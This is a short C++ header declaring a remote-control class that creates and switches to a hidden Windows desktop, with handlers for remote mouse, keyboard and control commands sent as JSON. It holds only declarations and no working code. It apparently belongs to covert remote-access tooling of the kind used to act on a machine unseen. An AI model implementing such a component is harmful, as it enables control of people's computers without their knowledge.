#pragma once
#include "Global.h"

// Remote Control with Hidden Desktop support
class RemoteDesktop {
private:
    HDESK m_hOriginalDesktop;
    HDESK m_hHiddenDesktop;
    bool m_isUsingHiddenDesktop;
    
public:
    RemoteDesktop();
    ~RemoteDesktop();
    
    bool CreateHiddenDesktop();
    bool SwitchToHiddenDesktop();
    bool SwitchToOriginalDesktop();
    void Cleanup();
    
    HDESK GetCurrentDesktop() const { return m_isUsingHiddenDesktop ? m_hHiddenDesktop : m_hOriginalDesktop; }
    bool IsUsingHiddenDesktop() const { return m_isUsingHiddenDesktop; }
};

// Remote Control Functions
void HandleMouseEvent(const json& data);
void HandleKeyboardEvent(const json& data);
void HandleRemoteControl(const std::string& action, const json& data);

// Global remote desktop instance
extern RemoteDesktop* g_RemoteDesktop;
